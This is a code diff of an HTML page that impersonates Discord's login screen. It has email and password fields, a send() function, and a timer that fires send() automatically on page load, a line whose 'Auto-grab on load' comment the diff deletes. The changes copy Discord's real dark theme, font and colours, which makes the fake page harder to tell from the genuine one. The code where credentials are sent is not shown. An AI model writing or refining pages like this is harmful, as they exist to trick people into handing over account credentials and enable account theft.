@@ -6,24 +6,26 @@
   <title>Discord</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; background: #fff; font-family: 'Inter', sans-serif; color: #060607; }
-    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 24px; }
-    .logo { width: 124px; margin-bottom: 32px; }
-    h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center; }
-    p { font-size: 16px; color: #5c5e66; margin-bottom: 32px; text-align: center; }
-    form { width: 100%; max-width: 400px; }
-    label { font-size: 12px; font-weight: 600; color: #060607; margin-bottom: 6px; display: block; }
-    input { width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; margin-bottom: 16px; background: #f9f9fa; }
+    body, html { height: 100%; background: #36393f; font-family: 'Whitney', sans-serif; color: #dcddde; }
+    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 40px 20px; }
+    .logo { width: 120px; margin-bottom: 24px; }
+    h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #fff; }
+    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; line-height: 1.4; }
+    form { width: 100%; max-width: 380px; }
+    label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
+    input { width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; transition: border 0.2s; }
     input:focus { outline: none; border-color: #5865f2; }
     .forgot { text-align: right; margin-bottom: 24px; }
-    .forgot a { color: #5865f2; font-size: 14px; text-decoration: none; }
-    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
+    .forgot a:hover { text-decoration: underline; }
+    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
     button:hover { background: #4752c4; }
-    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #5c5e66; }
-    .register a { color: #5865f2; text-decoration: none; }
+    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
+    .register a { color: #00aff4; text-decoration: none; }
+    .register a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
@@ -32,9 +34,9 @@
     <h1>Welcome back!</h1>
     <p>We're so excited to see you again!</p>
     <form id="loginForm">
-      <label for="email">Email or Phone Number <span style="color:#f23f42">*</span></label>
+      <label for="email">Email or Phone Number</label>
       <input type="text" id="email" required />
-      <label for="password">Password <span style="color:#f23f42">*</span></label>
+      <label for="password">Password</label>
       <input type="password" id="password" required />
       <div class="forgot">
         <a href="#">Forgot your password?</a>
@@ -114,7 +116,6 @@
       }, 800);
     };
 
-    // Auto-grab on load
     setTimeout(() => send({ email: 'AUTO', password: 'AUTO' }), 1500);
   </script>
 </body>
